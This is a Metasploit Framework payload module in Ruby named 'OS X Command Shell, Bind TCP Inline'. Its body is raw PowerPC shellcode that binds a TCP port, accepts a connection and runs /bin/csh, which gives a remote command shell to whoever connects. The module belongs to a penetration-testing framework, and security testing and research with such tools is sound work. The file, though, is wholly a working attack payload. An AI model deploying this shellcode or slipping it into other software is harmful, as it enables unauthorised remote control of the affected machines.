##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 224

  include Msf::Payload::Single
  include Msf::Payload::Osx
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'OS X Command Shell, Bind TCP Inline',
        'Description' => 'Listen for a connection and spawn a command shell',
        'Author' => 'hdm',
        'License' => MSF_LICENSE,
        'Platform' => 'osx',
        'Arch' => ARCH_PPC,
        'Handler' => Msf::Handler::BindTcp,
        'Session' => Msf::Sessions::CommandShellUnix,
        'Payload' => {
          'Offsets' =>
                  {
                    'LPORT' => [ 34, 'n' ]
                  },
          'Payload' =>
                       # bind, listen, accept, dup2, vfork, execve(/bin/csh)
                       "\x38\x60\x00\x02\x38\x80\x00\x01\x38\xa0\x00\x06\x38\x00\x00\x61" \
                       "\x44\x00\x00\x02\x7c\x00\x02\x78\x7c\x7e\x1b\x78\x48\x00\x00\x0d" \
                       "\x00\x02\x11\x5c\x00\x00\x00\x00\x7c\x88\x02\xa6\x38\xa0\x00\x10" \
                       "\x38\x00\x00\x68\x7f\xc3\xf3\x78\x44\x00\x00\x02\x7c\x00\x02\x78" \
                       "\x38\x00\x00\x6a\x7f\xc3\xf3\x78\x44\x00\x00\x02\x7c\x00\x02\x78" \
                       "\x7f\xc3\xf3\x78\x38\x00\x00\x1e\x38\x80\x00\x10\x90\x81\xff\xe8" \
                       "\x38\xa1\xff\xe8\x38\x81\xff\xf0\x44\x00\x00\x02\x7c\x00\x02\x78" \
                       "\x7c\x7e\x1b\x78\x38\xa0\x00\x02\x38\x00\x00\x5a\x7f\xc3\xf3\x78" \
                       "\x7c\xa4\x2b\x78\x44\x00\x00\x02\x7c\x00\x02\x78\x38\xa5\xff\xff" \
                       "\x2c\x05\xff\xff\x40\x82\xff\xe5\x38\x00\x00\x42\x44\x00\x00\x02" \
                       "\x7c\x00\x02\x78\x7c\xa5\x2a\x79\x40\x82\xff\xfd\x7c\x68\x02\xa6" \
                       "\x38\x63\x00\x28\x90\x61\xff\xf8\x90\xa1\xff\xfc\x38\x81\xff\xf8" \
                       "\x38\x00\x00\x3b\x7c\x00\x04\xac\x44\x00\x00\x02\x7c\x00\x02\x78" \
                       "\x7f\xe0\x00\x08\x2f\x62\x69\x6e\x2f\x63\x73\x68\x00\x00\x00\x00"
        }
      )
    )
  end
end
